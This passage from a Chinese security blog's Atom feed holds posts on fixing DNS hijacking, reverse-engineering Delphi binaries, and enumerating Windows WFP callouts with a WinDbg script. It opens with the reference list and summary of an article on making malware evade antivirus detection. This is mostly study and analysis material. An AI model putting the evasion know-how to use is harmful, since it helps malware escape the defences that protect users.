href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx</a><br>The Antivirus Hacker’s Handbook<br>The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System<br><a href="http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf" target="_blank" rel="external">http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf</a><br><a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank" rel="external">http://pferrie.host22.com/papers/antidebug.pdf</a><br><a href="https://www.symantec.com/connect/articles/windows-anti-debug-reference" target="_blank" rel="external">https://www.symantec.com/connect/articles/windows-anti-debug-reference</a><br><a href="https://www.exploit-db.com/docs/18849.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/18849.pdf</a><br><a href="http://blog.sevagas.com/?Fun-combining-anti-debugging-and" target="_blank" rel="external">http://blog.sevagas.com/?Fun-combining-anti-debugging-and</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记录一次被DNS劫持及解决方案(非改hosts方式)]]></title>
    <link href="http://www.youngroe.com/2020/08/02/Life/dns_hijacking/"/>
    <id>http://www.youngroe.com/2020/08/02/Life/dns_hijacking/</id>
    <published>2020-08-02T04:45:15.000Z</published>
    <updated>2020-08-07T16:15:52.418Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"><br></div>

<a id="more"></a>
<p>猜测是不是电脑系统出现问题了，但是手机连接上电脑宽带的wifi也连接不上，但是用4G网络可以，问题应该与系统无关，是运营商宽带的问题了。但是还是不知道具体那个环节出问题了，搜到一篇blog现象基本相同 <a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a>，但是文章中没有提解决方案，不过通过文章描述的现象及本地Wireshark抓包分析，是遇到dns劫持了，劫持方式是直接修改dns返回包。<br>只要是github.io下的域名全部被解析到了127.0.0.1，导致访问本地网络，同时正好装了Vmware的虚拟机，Vmware在本地会监听443端口，这样访问github.io相关域名会访问到本地Vmware开的端口上，并且Vmware的证书没有经过CA认证，Chrome会首先报证书错误，同时Vmware在443端口可能也没有提供http服务，即使忽略证书错误，网页也打不开。<br>尝试换DNS服务器，能正常几秒钟马上又被解析到127.0.0.1了，太丧心病狂了。</p>
<div align="center"><br><img src="/img/20200808_dns_nslookup.png" align="修改DNS服务器也不行"><br></div><br><div align="center"><br><img src="/img/20200802_dns_wireshark.png" align="Wireshark抓包发现，DNS返回包被修改"><br></div>

<h2 id="0x01_解决方案">0x01 解决方案</h2><p>在文章<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>中提到过通过HTTPS协议查询DNS的方式，正好可以解决这个问题，步骤如下：</p>
<ul>
<li>下载<a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a>，直接运行cloudflared.exe</li>
<li>修改电脑的dns服务器地址为127.0.0.1<br>这样设置后就不会被劫持了，可以正常访问github.io下的域名了，具体原理参考<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
<p>另外如果cloudflare的doh服务器地址（1.1.1.1）被ban也可以使用<a href="https://github.com/bitbeans/SimpleDnsCrypt/" target="_blank" rel="external">SimpleDnsCrypt</a>原理相同。当然也可以使用带有DOH功能得浏览器，如firefox，不过仅对浏览器本身有效，非全局，其他程序还是存在被DNS劫持风险。<br>希望对遇到这个问题的人有用。</p>
<h2 id="0x02_参考文章">0x02 参考文章</h2><ul>
<li><a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a></li>
<li><a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a></li>
<li><a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"/><br></div>]]>
    
    </summary>
    
      <category term="DNS劫持" scheme="http://www.youngroe.com/tags/DNS%E5%8A%AB%E6%8C%81/"/>
    
      <category term="Life" scheme="http://www.youngroe.com/categories/Life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Delphi程序逆向反汇编技巧小记]]></title>
    <link href="http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/"/>
    <id>http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/</id>
    <published>2019-07-01T12:13:53.000Z</published>
    <updated>2020-07-22T12:59:47.350Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br><a id="more"></a><br>VCL采用特有的RCDATA资源格式，RCDATA中包含有Delphi窗口（Forms）信息，当程序运行时通过初始化代码建立窗口，从RCDATA中获取所需要的信息。RCDATA信息可以通过PE Explorer等PE编辑器查看。</p>
<div align="center"><br><img src="/img/Delphi RCDATA.jpg" alt="Delphi窗口Form信息" align="center"><br></div><br>Delphi版本较多，不同版本有一些差异，目前已经发布的版本包括1-7, 2005, 2006, 2007, 2009, 2010, XE-XE8、10、10.1、10.2、10.3。Delphi的API查询可以通过参考链接2进行查询。<br><br>### 2.Delphi二进制特点<br><br>可以通过exeinfo/Detect It Easy等工具判断PE文件是否为Delphi开发及确定具体的Delphi版本信息，确定具体的版本信息有助于后续反汇编工具的设置，使工具反汇编出可读性更高的汇编代码。<br>Delphi常用的字符串的内存布局不同于C/C++的char*或则string对象，Delphi使用的字符串都是Pascal的字符串，在原始字符串前面存放的是字符串的长度<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint32_t len;</span><br><span class="line"><span class="keyword">char</span>    <span class="keyword">str</span>[];</span><br></pre></td></tr></table></figure><br><br><div align="center"><br><img src="/img/Delphi Str.jpg" alt="Delphi字符串内存布局" align="center"><br></div>

<p>Delphi遵循_fastcall调用约定，但是与Windows的_fastcall略有不同，参数顺序为eax为第一个参数、edx为第二个参数、ecx为第三个参数，大于3个的参数通过堆栈传递，大于三个的堆栈顺序从左到右依次压栈，堆栈由被调用者恢复。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="number">00451F</span>91   <span class="number">6</span>A04                   push    $<span class="number">04</span></span><br><span class="line"><span class="number">00451F</span>93   <span class="number">6</span>A05                   push    $<span class="number">05</span></span><br><span class="line"><span class="number">00451F</span>95   B903000000             mov     ecx, $<span class="number">00000003</span></span><br><span class="line"><span class="number">00451F</span>9A   BA02000000             mov     edx, $<span class="number">00000002</span></span><br><span class="line"><span class="number">00451F</span>9F   B801000000             mov     eax, $<span class="number">00000001</span></span><br><span class="line"><span class="number">00451F</span>A4   E8C7FFFFFF             call    <span class="number">00451F</span>70</span><br></pre></td></tr></table></figure></p>
<p>Delphi的按钮事件地址是通过按钮名字和地址绑定的，具体为一个按钮名称对应一个按钮事件响应函数地址。而按钮名称可以在Delphi的RCDATA资源中找到，具体为通过PE Explorer打开资源RC数据，找到相应界面的Form，找到按钮名称的字符串值。</p>
<div align="center"><br><img src="/img/Delphi Button.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div><br>这里为”Button1Click”，然后再IDA或则16进制编辑器中搜索该字符串，应该可以找到两个Button1Click字符串。其中一个是资源本身，另一个是事件地址和事件响应函数地址表，其中上面是地址下面是名称，Button1Click的地址表如下：<br><div align="center"><br><img src="/img/Delphi Button Func.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div>

<h2 id="0x01_反汇编Delphi如何设置IDA_pro">0x01 反汇编Delphi如何设置IDA pro</h2><p>在使用ida进行反汇编时，大多数情况我们都会使用ida默认设置进行的反编译，在具体到某个函数时会对反汇编的字符串、语言、函数调用约定等进行一些小的调整。对一般程序这种设置反汇编效果都还不错，但是对Delphi程序这样反汇编出来的代码可读性很差，具体表现是函数的调用约定可能识别错误，字符串信息也不能自动识别。这时我们可以通过手动设置ida的反汇编选项对反汇编效果进行调节，具体如下：</p>
<ul>
<li>Load a new file,取消勾选的Analysis下的两个自动分析选项</li>
<li>Options–&gt;Compiler:Compiler（Delphi）、Calling convention(FastCall)</li>
<li>Options–&gt;General–&gt;String:Default string literal type(Pascal/Pascal16)</li>
<li>View–&gt;View–&gt;Open Subviews–&gt;Type libraries, remove the defaults</li>
<li>View–&gt;Open Subviews–&gt;Signatures–&gt;Apply new Signatures:选择delphi相关Signatures</li>
<li>Edit–&gt;Select all,在IDA View区域右键Analyze selected area</li>
</ul>
<p>经过这样一番设置后，IDA反汇编出来的效果比默认设置会好很多，但是IDA毕竟是一个通用反汇编工具，对Delphi程序的效果只能说差强人意，对delphi的一些库函数识别有限，并且对RCDATA的资源也未做特定解析，但是好在有另外一个神器，能大大优化IDA的不足，它就是IDR。</p>
<h2 id="0x02_Delphi反汇编大杀器IDR">0x02 Delphi反汇编大杀器IDR</h2><p><div align="center"><br><img src="/img/Delphi IDR.jpg" alt="IDR窗口" align="center"><br></div><br>IDR全称为Interactive Delphi Reconstructor，从名字上我们就可以知道这是一款专门针对Delphi的反汇编工具，工具下载地址可以参考参考链接3、4，主要模块包括:</p>
<ul>
<li>Idr.exe，IDR主功能模块</li>
<li>dis.dll 反汇编模块</li>
<li>*.bin  类似IDA的sig文件，用于识别Delphi的库函数</li>
</ul>
<p>IDR相对于IDA的优势如下：</p>
<ul>
<li>得益于多个版本的符号bin文件，IDR能够识别大部分Delphi库函数，比IDA的识别率高很多</li>
<li>默认设置直接解析delphi程序的字符串信息，在IDR Strings可以查看和搜索这些字符串</li>
<li>可视化查看delphi的RCDATA信息Form界面信息，并且能够直接获得按钮等元素的响应函数地址</li>
<li>ClassViewer窗口可直接查看部分类及函数名称，猜测这部分函数为RCDATA中声明的函数或则类似C++的RTTI信息</li>
</ul>
<p>虽然IDR针对Delphi程序的反汇编有这么多优势，但是相对于IDA还是缺少一些反汇编的高级功能，如图形化展示反汇编函数图、F5功能等。但好在IDR提供了导出功能，可以导出map、idc文件供IDA使用，这样就可以结合两个工具的优势分析Delphi程序，这样简直得心应手啊。</p>
<h2 id="0x03_简单总结">0x03 简单总结</h2><p>当分析一种新的语言或则类库开发的程序的时候，还是可以通过搜索或则询问学习一些该语言的基础知识，如字符串内存布局、默认调用约定等，这样在逆向分析时候可以大大增加我们的效率，减少体力活。<br>同时在学习到一些基础知识后，我们也能更好的使用所用的工具，不要迷信自动分析，必要时通过手动设置一些选项也能大大增加我们逆向分析的效率。</p>
<h2 id="0x04_参考链接">0x04 参考链接</h2><p><a href="https://zh.wikipedia.org/wiki/Delphi" target="_blank" rel="external">1.Delphi维基百科</a><br><a href="http://docwiki.embarcadero.com/Libraries/Tokyo/en/Main_Page" target="_blank" rel="external">2.Delphi语言的MSDN</a><br><a href="https://github.com/crypto2011/IDR" target="_blank" rel="external">3.IDR github</a><br><a href="https://www.52pojie.cn/thread-367796-1-1.html" target="_blank" rel="external">4.IDR下载地址</a><br><a href="https://forum.exetools.com/showthread.php?p=117450&amp;nojs=1" target="_blank" rel="external">5.Reverse engineering Delphi executables?</a><br><a href="https://reverseengineering.stackexchange.com/questions/2873/which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re" target="_blank" rel="external">6.which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br>]]>
    
    </summary>
    
      <category term="Delphi" scheme="http://www.youngroe.com/tags/Delphi/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数]]></title>
    <link href="http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/"/>
    <id>http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/</id>
    <published>2019-06-25T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.201Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br><a id="more"></a></p>
<p><div align="center"><br><img src="/img/wfp_arch.jpg" alt="WFP框架" align="center"><br></div><br>WFP架构如上图所示，虽然提供了用户态和内核态的接口，但是干事情部分都在内核层，关于WFP驱动的开发可以看下参考链接1。<br>在内核态最主要干活的，是通过FwpsCalloutRegister注册的三个回调函数，注册成功后会返回一个callout_id用于标识被注册的wfp callout对象。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> FWPS_<span class="built_in">CALLOUT1_</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// Uniquely identifies the callout. This must be the same GUID supplied to</span></span><br><span class="line">   <span class="comment">// FwpmCalloutAdd0.</span></span><br><span class="line">   G<span class="built_in">UID</span> calloutKey;</span><br><span class="line">   <span class="comment">// Flags</span></span><br><span class="line">   <span class="built_in">UINT32</span> flags;</span><br><span class="line">   <span class="comment">// Pointer to the classification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_CLASSIFY_FN1</span> classifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the notification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_NOTIFY_FN1</span> notifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the flow delete function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_FLOW_DELETE_NOTIFY_FN0</span> flowDeleteFn;</span><br><span class="line">&#125; FWPS_<span class="built_in">CALLOUT1</span>;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>classifyFn：主要干活的回调，可以获得网络包全部信息(与注册类型相关)，可以实现网络包数据拦截、编辑等。</li>
<li>notifyFn：当过滤器被添加到过滤引擎时被调用。</li>
<li>flowDeleteFn：当一个网络数据被终止时调用，这个函数中可以对classifyfn中的操作进行清理。<br>那如何枚举出这三个函数呢，如何实现类似Pchunter中枚举系统回调的功能呢，关联出时哪一个驱动注册的wfp网络过滤函数？</li>
</ul>
<h2 id="0x01_分析">0x01 分析</h2><p>最好的方式是找找有没用类似功能的软件，或则前人相关的分析。无奈只能找到一个参考链接2中的msdn中的一个帖子，用户态提供FwpmCalloutEnum这个api可以枚举出系统中wfp信息，只有callout_id，没有注册这个callout的模块和callout function信息。<br>倒是有工具实现了这个功能，<a href="https://github.com/AxtMueller/Windows-Kernel-Explorer" target="_blank" rel="external">Windows-Kernel-Explorer</a>实现了，但是模块加了VMP，不是很好分析。那就正面入手分析callout function如何注册到系统的了。<br>好在函数逻辑很简单，函数调用链大概如下:fwpkclnt.sys!FwpsCalloutRegister1—–&gt;netio!KfdAddCalloutEntry——&gt;netio!FeAddCalloutEntry，核心代码在函数FeAddCalloutEntry中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000026</span>CA6 <span class="number">48</span> <span class="number">8</span>B <span class="number">05</span> F3 <span class="number">79</span> <span class="number">03</span> <span class="number">00</span>                    mov     rax, cs:gWfpGlobal</span><br><span class="line">.text:<span class="number">0000000000026</span>CAD <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">68</span>                             mov     ebx, [rsp+<span class="number">38</span>h+call_out_id_a6]</span><br><span class="line">.text:<span class="number">0000000000026</span>CB1 <span class="number">48</span> C1 E3 <span class="number">06</span>                             shl     rbx, <span class="number">6</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CB5 <span class="number">48</span> <span class="number">03</span> <span class="number">98</span> <span class="number">50</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>                    add     rbx, [rax+<span class="number">550</span>h]</span><br><span class="line">.text:<span class="number">0000000000026</span>CBC <span class="number">48</span> <span class="number">8</span>B CB                                mov     rcx, rbx</span><br><span class="line">.text:<span class="number">0000000000026</span>CBF E8 <span class="number">6</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          call    IsCalloutEntryAvailable</span><br><span class="line">.text:<span class="number">0000000000026</span>CC4 <span class="number">48</span> <span class="number">8</span>B F8                                mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CC7 <span class="number">48</span> <span class="number">85</span> C0                                test    rax, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CCA <span class="number">0F</span> <span class="number">85</span> <span class="number">10</span> <span class="number">8</span>C FF FF                       jnz     loc_1F8E0</span><br><span class="line">.text:<span class="number">0000000000026</span>CD0 <span class="number">48</span> <span class="number">89</span> <span class="number">03</span>                                mov     [rbx], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD3 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">08</span>                             mov     [rbx+<span class="number">8</span>], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD7 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                             mov     [rbx+<span class="number">28</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDB <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">30</span>                             mov     [rbx+<span class="number">30</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDF <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">38</span>                             mov     [rbx+<span class="number">38</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CE3 <span class="number">8</span>B <span class="number">44</span> <span class="number">24</span> <span class="number">60</span>                             mov     eax, dword ptr [rsp+<span class="number">38</span>h+arg_20]</span><br><span class="line">.text:<span class="number">0000000000026</span>CE7 <span class="number">48</span> <span class="number">89</span> <span class="number">73</span> <span class="number">20</span>                             mov     [rbx+<span class="number">20</span>h], rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>CEB <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">70</span>                          mov     rsi, [rsp+<span class="number">38</span>h+device_object]</span><br><span class="line">.text:<span class="number">0000000000026</span>CF0 <span class="number">44</span> <span class="number">89</span> <span class="number">2</span>B                                mov     [rbx], r13d</span><br><span class="line">.text:<span class="number">0000000000026</span>CF3 C7 <span class="number">43</span> <span class="number">04</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    mov     dword ptr [rbx+<span class="number">4</span>], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CFA <span class="number">4</span>C <span class="number">89</span> <span class="number">63</span> <span class="number">10</span>                             mov     [rbx+<span class="number">10</span>h], r12</span><br><span class="line">.text:<span class="number">0000000000026</span>CFE <span class="number">48</span> <span class="number">89</span> <span class="number">6</span>B <span class="number">18</span>                             mov     [rbx+<span class="number">18</span>h], rbp</span><br><span class="line">.text:<span class="number">0000000000026</span>D02 <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                                mov     [rbx+<span class="number">28</span>h], eax</span><br><span class="line">.text:<span class="number">0000000000026</span>D05 <span class="number">48</span> <span class="number">85</span> F6                                test    rsi, rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>D08 <span class="number">0F</span> <span class="number">85</span> BD <span class="number">8</span>B FF FF                       jnz     loc_1F8CB</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                         loc_26D0E:                              ; CODE XREF: FeAddCalloutEntry-<span class="number">7398</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                                                                 ; FeAddCalloutEntry-<span class="number">7380</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E <span class="number">48</span> <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">40</span>                          mov     rbx, [rsp+<span class="number">38</span>h+arg_0]</span><br><span class="line">.text:<span class="number">0000000000026</span>D13 <span class="number">48</span> <span class="number">8</span>B <span class="number">6</span>C <span class="number">24</span> <span class="number">48</span>                          mov     rbp, [rsp+<span class="number">38</span>h+arg_8]</span><br><span class="line">.text:<span class="number">0000000000026</span>D18 <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>                          mov     rsi, [rsp+<span class="number">38</span>h+arg_10]</span><br><span class="line">.text:<span class="number">0000000000026</span>D1D <span class="number">48</span> <span class="number">8</span>B C7                                mov     rax, rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D20 <span class="number">48</span> <span class="number">83</span> C4 <span class="number">20</span>                             add     rsp, <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000026</span>D24 <span class="number">41</span> <span class="number">5</span>D                                   pop     r13</span><br><span class="line">.text:<span class="number">0000000000026</span>D26 <span class="number">41</span> <span class="number">5</span>C                                   pop     r12</span><br><span class="line">.text:<span class="number">0000000000026</span>D28 <span class="number">5F</span>                                      pop     rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D29 C3                                      retn</span><br></pre></td></tr></table></figure></p>
<p>可以分析出对于每一个注册的callout，都会将callout的callout function信息放入一个结构体中，这些结构体都放在一个数组中，猜测这个结构体的名称叫CalloutEntry，每一个CallOutEntry的大小应该是64(左移6位，相当于乘以64)。而每一个callout_id对应的CallOutEntry结构的基地址应该等于[[gWfpGlobal]+0x550] + callout_id*64，而CallOutEntry结构体内容应该如下所示。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>   unknow1</span><br><span class="line">+<span class="number">0x8</span>   unknow2</span><br><span class="line">+<span class="number">0x10</span>  classifyFn</span><br><span class="line">+<span class="number">0x18</span>  notifyFn</span><br><span class="line">+<span class="number">0x20</span>  flowDeleteFn</span><br><span class="line">+<span class="number">0x28</span>  unknow3</span><br><span class="line">+<span class="number">0x30</span>  unknow4</span><br><span class="line">+<span class="number">0x38</span>  device_object</span><br></pre></td></tr></table></figure></p>
<p>分析到这里再通过关键词gWfpGlobal搜索，可以找到参考链接3，参考链接3给出了一个windbg脚本，这里可以优化下，可以直接再Win7 x64系统下打印出系统中所有的callout function函数地址（如果提示找不到符号地址，可以执行下.reload /f /i netio.sys）。<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r <span class="variable">$t0</span>=poi(poi(netio!gWfpGlobal)+<span class="number">0x550</span>);.<span class="keyword">for</span> ( r <span class="variable">$t1</span>=<span class="number">0</span>; @<span class="variable">$t1</span> &lt; <span class="number">11</span>e; r <span class="variable">$t1</span>=@<span class="variable">$t1</span>+<span class="number">1</span> ) &#123;r <span class="variable">$t1</span>;dps @<span class="variable">$t0</span>+<span class="number">2</span>*@<span class="variable">$ptrsize</span> L3; r <span class="variable">$t0</span>=@<span class="variable">$t0</span>+<span class="number">40</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02_参考">0x02 参考</h2><p><a href="https://qwertwwwe.github.io/windows-driver-develop-wfp-framework/" target="_blank" rel="external">1.windows驱动-WFP框架介绍及其编程</a><br><a href="https://social.msdn.microsoft.com/Forums/vstudio/en-US/66f1f00b-eab5-4d60-b8da-55010d023ebf/list-of-callout-drivers?forum=wfp" target="_blank" rel="external">2.List of callout drivers</a><br><a href="https://www.codemachine.com/article_findwfpcallouts.html" target="_blank" rel="external">3.Finding Windows Filtering Platform (WFP) Callouts</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br>]]>
    
    </summary>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/"/>
    <id>http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/</id>
    <published>2019-05-06T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.204Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br><a id="more"></a></p>
<h2 id="0x01_Windows驱动程序的定义及类型">0x01 Windows驱动程序的定义及类型</h2><p>驱动程序是为物理或则虚拟设备提供接口的一种软件组件。驱动程序将来自用户程序和操作系统的high-level的请求翻译成物理/虚拟设备能够识别的low-level的指令。</p>
